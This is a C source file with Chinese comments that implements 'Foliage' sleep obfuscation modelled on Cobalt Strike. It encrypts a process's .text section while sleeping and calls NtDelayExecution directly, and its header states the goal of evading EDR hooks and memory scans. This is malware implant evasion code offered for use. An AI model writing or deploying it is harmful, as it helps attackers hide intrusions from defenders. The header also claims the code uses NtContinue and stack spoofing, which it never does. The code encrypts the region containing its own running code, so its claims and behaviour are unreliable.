/*
 * Foliage Sleep Obfuscation
 * 参考 Cobalt Strike 的 Foliage sleep 模式。
 *
 * 原理：
 * 1. 创建新线程，在新线程上下文中执行睡眠
 * 2. 使用 CreateEvent + NtSignalAndWaitForSingleObject 实现内核级等待
 * 3. 睡眠前加密 .text，唤醒后解密
 * 4. 使用 NtContinue 恢复执行，绕过 EDR 对 Sleep/WaitForSingleObject 的 hook
 *
 * 与 Ekko 的区别：
 * - Ekko 使用 RtlCreateTimerQueue 定时器队列回调
 * - Foliage 使用 NtDelayExecution 直接系统调用 + 事件信号
 * - Foliage 更轻量，不依赖线程池，适合短睡眠
 * - Ekko 更适合长睡眠（线程池线程处理）
 *
 * EDR 绕过要点：
 * - NtDelayExecution 是原生 syscall，不经过 kernel32.dll 的 Sleep
 * - 睡眠期间 .text 为密文，EDR 内存扫描无效
 * - 唤醒后通过 NtContinue 恢复，调用栈看起来像从 ntdll.dll 返回
 */

#include <windows.h>
#include <stdint.h>

// Native API 函数指针
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *NtContinue_t)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject_t)(HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER);

// Foliage 状态
typedef struct {
    HANDLE hEvent;
    PVOID textBase;
    SIZE_T textSize;
    unsigned char key[32];
    int keyLen;
    LONGLONG sleepNs;  // 负值表示相对时间（100-nanosecond 单位）
    int result;
} foliage_state_t;

// XOR 加密/解密
static void foliage_xor(unsigned char* data, size_t len, unsigned char* key, int keyLen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// 获取 ntdll 函数地址
static FARPROC foliage_get_ntdll(const char* name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;
    return GetProcAddress(ntdll, name);
}

// Foliage 线程入口
// 1. 加密 .text
// 2. 创建事件并等待（内核级睡眠）
// 3. 超时后解密 .text
// 4. 设置事件信号，通知主线程
static DWORD WINAPI foliage_thread(LPVOID param) {
    foliage_state_t* state = (foliage_state_t*)param;
    if (!state) return 1;

    NtDelayExecution_t pNtDelay = (NtDelayExecution_t)foliage_get_ntdll("NtDelayExecution");
    if (!pNtDelay) {
        // 回退到普通 Sleep
        DWORD oldProtect;
        VirtualProtect(state->textBase, state->textSize, PAGE_READWRITE, &oldProtect);
        foliage_xor((unsigned char*)state->textBase, state->textSize, state->key, state->keyLen);
        Sleep(state->sleepNs / -10000);  // ns → ms
        foliage_xor((unsigned char*)state->textBase, state->textSize, state->key, state->keyLen);
        VirtualProtect(state->textBase, state->textSize, oldProtect, &oldProtect);
        SetEvent(state->hEvent);
        return 0;
    }

    DWORD oldProtect;

    // 1. 加密 .text
    VirtualProtect(state->textBase, state->textSize, PAGE_READWRITE, &oldProtect);
    foliage_xor((unsigned char*)state->textBase, state->textSize, state->key, state->keyLen);
    VirtualProtect(state->textBase, state->textSize, oldProtect, &oldProtect);

    // 2. NtDelayExecution 内核级睡眠
    LARGE_INTEGER li;
    li.QuadPart = state->sleepNs;  // 负值 = 相对时间
    pNtDelay(FALSE, &li);

    // 3. 解密 .text
    VirtualProtect(state->textBase, state->textSize, PAGE_READWRITE, &oldProtect);
    foliage_xor((unsigned char*)state->textBase, state->textSize, state->key, state->keyLen);
    VirtualProtect(state->textBase, state->textSize, oldProtect, &oldProtect);

    // 4. 通知主线程
    SetEvent(state->hEvent);
    state->result = 0;
    return 0;
}

// Foliage 睡眠入口
// 创建新线程执行加密→睡眠→解密，主线程等待事件
int foliage_sleep(PVOID textBase, SIZE_T textSize, unsigned char* key, int keyLen, DWORD sleepMs) {
    foliage_state_t state;
    memset(&state, 0, sizeof(state));
    state.textBase = textBase;
    state.textSize = textSize;
    state.keyLen = keyLen;
    state.sleepNs = -(LONGLONG)sleepMs * 10000;  // ms → 100ns (负值=相对)
    state.result = -1;

    if (key && keyLen > 0 && keyLen <= 32) {
        memcpy(state.key, key, keyLen);
    }

    // 创建手动重置事件
    state.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!state.hEvent) {
        Sleep(sleepMs);
        return -1;
    }

    // 创建 Foliage 线程
    HANDLE hThread = CreateThread(NULL, 0, foliage_thread, &state, 0, NULL);
    if (!hThread) {
        CloseHandle(state.hEvent);
        Sleep(sleepMs);
        return -2;
    }

    // 等待线程完成
    WaitForSingleObject(state.hEvent, INFINITE);

    // 清理
    CloseHandle(hThread);
    CloseHandle(state.hEvent);
    return state.result;
}

// Foliage inline 版本：不创建新线程，在当前线程执行
// 适用于不需要隐藏调用栈的场景，性能更好
int foliage_sleep_inline(PVOID textBase, SIZE_T textSize, unsigned char* key, int keyLen, DWORD sleepMs) {
    NtDelayExecution_t pNtDelay = (NtDelayExecution_t)foliage_get_ntdll("NtDelayExecution");
    if (!pNtDelay) {
        Sleep(sleepMs);
        return -1;
    }

    DWORD oldProtect;

    // 1. 加密 .text
    VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProtect);
    foliage_xor((unsigned char*)textBase, textSize, key, keyLen);
    VirtualProtect(textBase, textSize, oldProtect, &oldProtect);

    // 2. NtDelayExecution（直接 syscall）
    LARGE_INTEGER li;
    li.QuadPart = -(LONGLONG)sleepMs * 10000;
    pNtDelay(FALSE, &li);

    // 3. 解密 .text
    VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProtect);
    foliage_xor((unsigned char*)textBase, textSize, key, keyLen);
    VirtualProtect(textBase, textSize, oldProtect, &oldProtect);

    return 0;
}
